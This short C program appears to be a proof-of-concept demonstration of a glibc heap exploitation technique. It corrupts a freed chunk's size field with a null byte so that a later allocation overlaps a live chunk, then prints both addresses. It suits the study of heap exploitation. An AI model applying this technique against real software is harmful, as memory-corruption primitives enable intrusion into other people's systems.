#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>


int main()
{    
    char* chunkarray[0x10];

    char* chunk1=malloc(0x200);
    char* chunk2=malloc(0x200);
    char* chunk3=malloc(0x200);
    malloc(0x10);
   

    free(chunk2);  // make chunk prev_size for chunk 2 size
    *(char*)(chunk2-8)=0;

    char* chunk4=malloc(0x80);   // needed into unsortedbin  else unlink can't pass
    char* chunk5=malloc(0x80);  //  part of emainder can control remainder  
    free(chunk4);

    free(chunk3);   // merge 
    char* chunk6=malloc(0x410);
    
    printf("chunk5 data begin %p \n",chunk5);

    printf("&chunk6[0x90] %p \n",&chunk6[0x90]);

}